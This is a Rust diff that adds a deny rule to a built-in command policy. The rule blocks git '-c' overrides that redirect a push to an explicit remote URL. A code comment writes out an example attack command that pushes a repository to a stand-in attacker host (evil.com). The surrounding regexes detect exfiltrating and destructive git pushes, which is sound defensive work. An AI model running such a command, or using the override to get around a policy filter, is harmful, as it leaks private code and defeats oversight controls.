@@ -595,6 +595,15 @@ fn builtin_deny_rules() -> Vec<PolicyRule> {
             "git-push-explicit-url",
             r"git\b[^|;\n]*\bpush\b[^|;\n]*(?:https?://|ssh://|git://|[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+:)",
         ),
+        // `git -c remote.origin.pushurl=https://evil.com/repo.git push origin`
+        // — an attacker can redirect a named-remote push to an arbitrary URL
+        // by injecting a one-shot `-c` config override before the push
+        // subcommand.  Block any `-c` that sets a `url` or `pushurl` key to an
+        // explicit remote URL (same scheme set as the direct-URL rule above).
+        PolicyRule::deny_static(
+            "git-config-remote-url-override",
+            r"git\b[^|;\n]*-c\s*[^=|;\n]*(?:push)?url\s*=\s*(?:https?://|ssh://|git://|[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+:)",
+        ),
         // `git push --force` / `git push -f` / `git push -fv` / `git -C dir push --force`
         // `git push --mirror` — mirror pushes force-update all refs and delete
         // refs absent locally; all forms are destructive and never expected in
